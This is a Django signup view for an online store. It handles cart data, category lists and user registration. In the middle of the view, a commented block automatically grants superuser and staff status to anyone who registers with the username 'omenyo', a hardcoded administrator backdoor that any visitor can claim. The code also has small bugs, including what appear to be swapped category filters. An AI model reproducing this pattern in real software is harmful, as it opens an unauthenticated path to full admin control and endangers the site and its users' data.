from django.shortcuts import render, redirect
from django.contrib.auth.hashers import make_password
from .home import store
from django.contrib.auth.models import User
from django.views import View
from django.contrib import messages
from .forms import RegistrationForm
from store.models.product import Product
from store.models.brand import Brand
from store.models.category import Category

def signup(response):
    cart = response.session.get('cart')
    if not cart:
        response.session['cart'] = {}
        productes = {}
    else:
        productes = Product.get_products_by_id(list(response.session.get('cart').keys()))
        
    brands = Brand.get_all_brand()
    categories = Category.get_all_categories()
    fashion_cat = Category.objects.filter(is_tech=True)
    tech_cat = Category.objects.filter(is_fashion=True)
    cat_home = Category.objects.filter(is_home=True)
    party_cat = Category.objects.filter(is_party=True)
    tagged_cat = Category.objects.filter(is_tagged=True)
    
    if response.method == "POST":
        form = RegistrationForm(response.POST)
        if form.is_valid():
            if User.objects.filter(email=form.cleaned_data['email']).exists():
                messages.success(response, f'Email already in use, Please use a different Email')
                return render(response, 'signup.html', {
                    'tagged_cat': tagged_cat,
                    'fashion_cat': fashion_cat,
                    'tech_cat': tech_cat,
                    'cat_home': cat_home,
                    'party_cat': party_cat,
                    'form': form,
                    'brands': brands,
                    'categories': categories
                })
            elif User.objects.filter(username=form.cleaned_data['username']).exists():
                messages.success(response, f'Username already in use, Please use a different Username')
                return render(response, 'signup.html', {
                    'tagged_cat': tagged_cat,
                    'fashion_cat': fashion_cat,
                    'tech_cat': tech_cat,
                    'cat_home': cat_home,
                    'party_cat': party_cat,
                    'form': form,
                    'brands': brands,
                    'categories': categories
                })
            
            # Save the user and set is_superuser and is_staff if username is "omenyo"
            user = form.save(commit=False)  # Save but don't commit yet
            if user.username == 'omenyo':
                user.is_superuser = True
                user.is_staff = True
            user.save()  # Now save the user with the updated permissions
            
            messages.success(response, f'Successfully Registered, Please log into your Account to Make Orders')
            return redirect('login')
    else:
        form = RegistrationForm()

    return render(response, 'signup.html', {
        'productes': productes,
        'tagged_cat': tagged_cat,
        'fashion_cat': fashion_cat,
        'tech_cat': tech_cat,
        'cat_home': cat_home,
        'party_cat': party_cat,
        'form': form,
        'brands': brands,
        'categories': categories
    })
